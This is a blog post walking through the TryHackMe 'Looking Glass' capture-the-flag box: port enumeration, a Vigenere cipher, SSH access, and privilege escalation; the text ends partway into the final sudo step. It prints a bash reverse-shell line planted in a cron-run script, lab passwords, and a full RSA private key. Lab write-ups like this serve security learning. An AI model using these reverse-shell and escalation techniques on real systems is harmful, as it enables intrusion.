<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="[TryHackMe] Looking Glass" /><meta name="author" content="Tri Nguyen" /><meta property="og:locale" content="en_US" /><meta name="description" content="IP: 10.10.219.9" /><meta property="og:description" content="IP: 10.10.219.9" /><link rel="canonical" href="/posts/TryHackMe-LookingGlass/" /><meta property="og:url" content="/posts/TryHackMe-LookingGlass/" /><meta property="og:site_name" content="Tri Nguyen" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-11-21T17:00:00-07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="[TryHackMe] Looking Glass" /><meta name="twitter:site" content="@letri6tdn" /><meta name="twitter:creator" content="@Tri Nguyen" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Tri Nguyen"},"dateModified":"2021-11-21T17:00:00-07:00","datePublished":"2021-11-21T17:00:00-07:00","description":"IP: 10.10.219.9","headline":"[TryHackMe] Looking Glass","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/TryHackMe-LookingGlass/"},"url":"/posts/TryHackMe-LookingGlass/"}</script><title>[TryHackMe] Looking Glass | Tri Nguyen</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tri Nguyen"><meta name="application-name" content="Tri Nguyen"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://i.imgur.com/Qql7PB7.jpg?1" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Tri Nguyen</a></div><div class="site-subtitle font-italic">I sometimes post things.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/infosec/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>INFOSEC</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/rcs-tringuyen" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/letri6tdn" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['tlnguyen','ualberta.ca'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <script src="https://tryhackme.com/badge/252485"></script></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>[TryHackMe] Looking Glass</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>[TryHackMe] Looking Glass</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Tri Nguyen </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Nov 21, 2021, 5:00 PM -0700" >Nov 21, 2021<i class="unloaded">2021-11-21T17:00:00-07:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1693 words">9 min read</span></div></div><div class="post-content"><p>IP: 10.10.219.9</p><h1 id="enumeration">Enumeration</h1><h2 id="nmap">nmap</h2><ul><li><p>nmap reveals 4993 open ports with 7 jetdirect? ports and the rest being Dropbear ssh ports…</p><li><p>Ranging from 22 to 13999.</p><li><p>Seems like no http port. These could be fake SSH ports? Anyways let’s try connecting to port 22. It requires a password here. Hmm seems like it’s the real port. Perhaps the clue are included in the other ports? Let’s try port 9000</p><li><p>Connecting to port 9000 we receive a message saying <code class="language-plaintext highlighter-rouge">Lower</code>. However we can’t go any lower. Recalling the name, Looking glass -&gt; <code class="language-plaintext highlighter-rouge">Lower</code> actually means <code class="language-plaintext highlighter-rouge">Higher</code>. Now all we are left to do is try ssh <code class="language-plaintext highlighter-rouge">O(log(n))</code> ports.</p><li>Trying something in the middle:<ul><li>11000: Lower -&gt; Higher<li>12000: Higher -&gt; Lower<li>11500: Higher -&gt; Lower<li>11250: Higher -&gt; Lower<li>11125: Lower -&gt; Higher<li>11187: Lower -&gt; Higher<li>11218: Higher -&gt; Lower<li>11202: Lower -&gt; Higher<li>11210: Higher -&gt; Lower<li>11206: Lower -&gt; Higher<li>11207 !!!!</ul><li>We know need to solve a puzzle.</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre>You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
</pre></table></code></div></div><ul><li><p>I thought Jabberwocky is the key but turns out it’s not.</p><li><p>I also tried with Caesar encryption but nope.</p><li><p>I worked with Vigenere Cipher. Set the autosolver from 10 to 20 keys worked.</p><blockquote><p><a href="https://www.boxentriq.com/code-breaking/vigenere-cipher">https://www.boxentriq.com/code-breaking/vigenere-cipher</a></p></blockquote><blockquote><p><img data-proofer-ignore data-src="/assets/img/thm-looking-glass.png" alt="Alt text" /></p></blockquote></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre>'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.

'Beware the Jabberwock, my son!
The jaws that bite, the claws that catch!
Beware the Jubjub bird, and shun
The frumious Bandersnatch!'

He took his vorpal sword in hand:
Long time the manxome foe he sought--
So rested he by the Tumtum tree,
And stood awhile in thought.

And as in uffish thought he stood,
The Jabberwock, with eyes of flame,
Came whiffling through the tulgey wood,
And burbled as it came!

One, two! One, two! And through and through
The vorpal blade went snicker-snack!
He left it dead, and with its head
He went galumphing back.

'And hast thou slain the Jabberwock?
Come to my arms, my beamish boy!
O frabjous day! Callooh! Callay!'
He chortled in his joy.

'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.
Your secret is bewareTheJabberwock
</pre></table></code></div></div><ul><li><p>We now have our secret: <code class="language-plaintext highlighter-rouge">bewareTheJabberwock</code></p><li><p><code class="language-plaintext highlighter-rouge">jabberwock:FlameTheseTurnedWrist</code></p></ul><h1 id="ssh">SSH</h1><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>jabberwock@looking-glass:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 44
drwxrwxrwx 5 jabberwock jabberwock 4096 Jul  3  2020 <span class="nb">.</span>
drwxr-xr-x 8 root       root       4096 Jul  3  2020 ..
lrwxrwxrwx 1 root       root          9 Jul  3  2020 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 jabberwock jabberwock  220 Jun 30  2020 .bash_logout
<span class="nt">-rw-r--r--</span> 1 jabberwock jabberwock 3771 Jun 30  2020 .bashrc
drwx------ 2 jabberwock jabberwock 4096 Jun 30  2020 .cache
drwx------ 3 jabberwock jabberwock 4096 Jun 30  2020 .gnupg
drwxrwxr-x 3 jabberwock jabberwock 4096 Jun 30  2020 .local
<span class="nt">-rw-r--r--</span> 1 jabberwock jabberwock  807 Jun 30  2020 .profile
<span class="nt">-rw-rw-r--</span> 1 jabberwock jabberwock  935 Jun 30  2020 poem.txt
<span class="nt">-rwxrwxr-x</span> 1 jabberwock jabberwock   38 Jul  3  2020 twasBrillig.sh
<span class="nt">-rw-r--r--</span> 1 jabberwock jabberwock   38 Jul  3  2020 user.txt
jabberwock@looking-glass:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
<span class="o">}</span>32a911966cab2d643f5d57d9e0173d56<span class="o">{</span>mht
jabberwock@looking-glass:~<span class="nv">$ </span><span class="nb">cat </span>user.txt | rev
thm<span class="o">{</span>65d3710e9d75d5f346d2bac669119a23<span class="o">}</span>
jabberwock@looking-glass:~<span class="nv">$ </span>
</pre></table></code></div></div><ul><li>The first flag!</ul><h1 id="jabberwock">jabberwock</h1><ul><li><p>Linpeas.sh shows nothing really promising.</p><li><p>There are a ton of users</p></ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>jabberwock@looking-glass:~<span class="nv">$ </span><span class="nb">ls</span> /home
alice  humptydumpty  jabberwock  tryhackme  tweedledee  tweedledum
</pre></table></code></div></div><ul><li>After going through my linux privEsc check list these are the promising things:</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>jabberwock@looking-glass:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>jabberwock on looking-glass:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User jabberwock may run the following commands on looking-glass:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /sbin/reboot
jabberwock@looking-glass:~<span class="nv">$ </span><span class="nb">cat</span> /etc/crontab
<span class="c"># /etc/crontab: system-wide crontab</span>
<span class="c"># Unlike any other crontab you don't have to run the `crontab'</span>
<span class="c"># command to install the new version when you edit this file</span>
<span class="c"># and files in /etc/cron.d. These files also have username fields,</span>
<span class="c"># that none of the other crontabs do.</span>

<span class="nv">SHELL</span><span class="o">=</span>/bin/sh
<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

<span class="c"># m h dom mon dow user  command</span>
17 <span class="k">*</span>    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.hourly
25 6    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.daily <span class="o">)</span>
47 6    <span class="k">*</span> <span class="k">*</span> 7   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.weekly <span class="o">)</span>
52 6    1 <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.monthly <span class="o">)</span>
<span class="c">#</span>
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
jabberwock@looking-glass:~<span class="nv">$ </span><span class="nb">cat </span>twasBrillig.sh 
wall <span class="si">$(</span><span class="nb">cat</span> /home/jabberwock/poem.txt<span class="si">)</span>
</pre></table></code></div></div><ul><li><p>We know that jabberwock can reboot as root, upon reboot <code class="language-plaintext highlighter-rouge">tweedledum</code> will execute <code class="language-plaintext highlighter-rouge">twasBrillig.sh</code>.</p><li><p>We can modify <code class="language-plaintext highlighter-rouge">twasBrillig.sh</code> so it gives us a shell as <code class="language-plaintext highlighter-rouge">tweedledum</code>!</p></ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>jabberwock@looking-glass:~<span class="nv">$ </span><span class="nb">cat </span>twasBrillig.sh 
bash <span class="nt">-I</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.2.51.175/4444 0&gt;&amp;1
</pre></table></code></div></div><ul><li>Now run <code class="language-plaintext highlighter-rouge">sudo reboot</code></ul><h1 id="tweedledum">tweedledum</h1><ul><li>We’ve got a shell as <code class="language-plaintext highlighter-rouge">tweedledum</code>. I still need tty shell though lol.</ul><p><code class="language-plaintext highlighter-rouge">python3 -c 'import pty; pty.spawn("/bin/bash")'</code></p><ul><li>Go to crackstation.net and try to crack the hash (SHA256)</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9:maybe
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed:one
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624:of
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f:these
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6:is
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0:the
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b:
</pre></table></code></div></div><ul><li><p>The last line is unknown…</p><li><p>I used cyberchef to crack the last one, which turns out to be a hex encoded string <code class="language-plaintext highlighter-rouge">the password is zyxwvutsrqponmlk</code></p></ul><h1 id="humptydumpty">humptydumpty</h1><ul><li><p>There is a poetry.txt file saying something related to alice but no other clues otherwise.</p><li><p>Notice when <code class="language-plaintext highlighter-rouge">ls -la /home</code> we see some strange permission for alice.</p></ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>humptydumpty@looking-glass:/home/alice<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /home
<span class="nb">ls</span> <span class="nt">-la</span> /home
total 32
drwxr-xr-x  8 root         root         4096 Jul  3  2020 <span class="nb">.</span>
drwxr-xr-x 24 root         root         4096 Jul  2  2020 ..
drwx--x--x  6 alice        alice        4096 Jul  3  2020 alice
drwx------  3 humptydumpty humptydumpty 4096 Nov 27 23:06 humptydumpty
drwxrwxrwx  6 jabberwock   jabberwock   4096 Nov 27 22:23 jabberwock
drwx------  5 tryhackme    tryhackme    4096 Jul  3  2020 tryhackme
drwx------  3 tweedledee   tweedledee   4096 Jul  3  2020 tweedledee
drwx------  2 tweedledum   tweedledum   4096 Jul  3  2020 tweedledum
</pre></table></code></div></div><ul><li>But we can’t run command there. Let’s try something else. Notice every folder has these file, let’s try to enumerate those of Alice.</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>humptydumpty@looking-glass:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="nb">ls</span> <span class="nt">-la</span>
total 28
drwx------ 3 humptydumpty humptydumpty 4096 Nov 27 23:06 <span class="nb">.</span>
drwxr-xr-x 8 root         root         4096 Jul  3  2020 ..
lrwxrwxrwx 1 root         root            9 Jul  3  2020 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 humptydumpty humptydumpty  220 Jul  3  2020 .bash_logout
<span class="nt">-rw-r--r--</span> 1 humptydumpty humptydumpty 3771 Jul  3  2020 .bashrc
drwx------ 3 humptydumpty humptydumpty 4096 Nov 27 23:06 .gnupg
<span class="nt">-rw-r--r--</span> 1 humptydumpty humptydumpty  807 Jul  3  2020 .profile
<span class="nt">-rw-r--r--</span> 1 humptydumpty humptydumpty 3084 Jul  3  2020 poetry.txt
</pre></table></code></div></div><ul><li><p>Nothing’s different in those files… Hmm? Maybe alice has an <code class="language-plaintext highlighter-rouge">.ssh</code> folder?</p><li><p>Correct, now we got alice’s id_rsa</p></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre>-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
NIRchPaFUqJXQZi5ryQH6YxZP5IIJXENK+a4WoRDyPoyGK/63rXTn/IWWKQka9tQ
2xrdnyxdwbtiKP1L4bq/4vU3OUcA+aYHxqhyq39arpeceHVit+jVPriHiCA73k7g
HCgpkwWczNa5MMGo+1Cg4ifzffv4uhPkxBLLl3f4rBf84RmuKEEy6bYZ+/WOEgHl
fks5ngFniW7x2R3vyq7xyDrwiXEjfW4yYe+kLiGZyyk1ia7HGhNKpIRufPdJdT+r
NGrjYFLjhzeWYBmHx7JkhkEUFIVx6ZV1y+gihQIDAQABAoIBAQDAhIA5kCyMqtQj
X2F+O9J8qjvFzf+GSl7lAIVuC5Ryqlxm5tsg4nUZvlRgfRMpn7hJAjD/bWfKLb7j
/pHmkU1C4WkaJdjpZhSPfGjxpK4UtKx3Uetjw+1eomIVNu6pkivJ0DyXVJiTZ5jF
ql2PZTVpwPtRw+RebKMwjqwo4k77Q30r8Kxr4UfX2hLHtHT8tsjqBUWrb/jlMHQO
zmU73tuPVQSESgeUP2jOlv7q5toEYieoA+7ULpGDwDn8PxQjCF/2QUa2jFalixsK
WfEcmTnIQDyOFWCbmgOvik4Lzk/rDGn9VjcYFxOpuj3XH2l8QDQ+GO+5BBg38+aJ
cUINwh4BAoGBAPdctuVRoAkFpyEofZxQFqPqw3LZyviKena/HyWLxXWHxG6ji7aW
DmtVXjjQOwcjOLuDkT4QQvCJVrGbdBVGOFLoWZzLpYGJchxmlR+RHCb40pZjBgr5
8bjJlQcp6pplBRCF/OsG5ugpCiJsS6uA6CWWXe6WC7r7V94r5wzzJpWBAoGBAM1R
aCg1/2UxIOqxtAfQ+WDxqQQuq3szvrhep22McIUe83dh+hUibaPqR1nYy1sAAhgy
wJohLchlq4E1LhUmTZZquBwviU73fNRbID5pfn4LKL6/yiF/GWd+Zv+t9n9DDWKi
WgT9aG7N+TP/yimYniR2ePu/xKIjWX/uSs3rSLcFAoGBAOxvcFpM5Pz6rD8jZrzs
SFexY9P5nOpn4ppyICFRMhIfDYD7TeXeFDY/yOnhDyrJXcbOARwjivhDLdxhzFkx
X1DPyif292GTsMC4xL0BhLkziIY6bGI9efC4rXvFcvrUqDyc9ZzoYflykL9KaCGr
+zlCOtJ8FQZKjDhOGnDkUPMBAoGBAMrVaXiQH8bwSfyRobE3GaZUFw0yreYAsKGj
oPPwkhhxA0UlXdITOQ1+HQ79xagY0fjl6rBZpska59u1ldj/BhdbRpdRvuxsQr3n
aGs//N64V4BaKG3/CjHcBhUA30vKCicvDI9xaQJOKardP/Ln+xM6lzrdsHwdQAXK
e8wCbMuhAoGBAOKy5OnaHwB8PcFcX68srFLX4W20NN6cFp12cU2QJy2MLGoFYBpa
dLnK/rW4O0JxgqIV69MjDsfRn1gZNhTTAyNnRMH1U7kUfPUB2ZXCmnCGLhAGEbY9
k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0
-----END RSA PRIVATE KEY-----
</pre></table></code></div></div><ul><li>Let’s try ssh with alice’s private key.</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Desktop/thm/looking-glass]
└─<span class="nv">$ </span>nano alice                                                                                                                           1 ⨯
                                                                                                                                             
┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Desktop/thm/looking-glass]
└─<span class="nv">$ </span><span class="nb">chmod </span>600 alice
                                                                                                                                             
┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Desktop/thm/looking-glass]
└─<span class="nv">$ </span>ssh <span class="nt">-i</span> alice alice@10.10.219.9
Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
alice@looking-glass:~<span class="nv">$ </span>
</pre></table></code></div></div><h1 id="alice">alice</h1><ul><li><p>Browsing around, there is literally nothing I can see… Again!</p><li><p>Try linpeas.sh, because I’m pretty manual inspection-wise I didn’t miss anything hmm..</p><li><p>After several tools of enumeration (<strong>linpeas was not working correctly, use linux smart enumeration instead</strong>), you will eventually found out how to read the sudoer files</p></ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>alice@looking-glass:~<span class="nv">$ </span><span class="nb">cd</span> /etc/sudoers.d
alice@looking-glass:/etc/sudoers.d<span class="nv">$ </span><span class="nb">ls
</span>README  alice  jabberwock  tweedles
alice@looking-glass:/etc/sudoers.d<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 24
drwxr-xr-x  2 root root 4096 Jul  3  2020 <span class="nb">.</span>
drwxr-xr-x 91 root root 4096 Nov 27 22:40 ..
<span class="nt">-r--r-----</span>  1 root root  958 Jan 18  2018 README
<span class="nt">-r--r--r--</span>  1 root root   49 Jul  3  2020 alice
<span class="nt">-r--r-----</span>  1 root root   57 Jul  3  2020 jabberwock
<span class="nt">-r--r-----</span>  1 root root  120 Jul  3  2020 tweedles
alice@looking-glass:/etc/sudoers.d<span class="nv">$ </span><span class="nb">cat </span>alice
alice ssalg-gnikool <span class="o">=</span> <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/bash
</pre></table></code></div></div><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
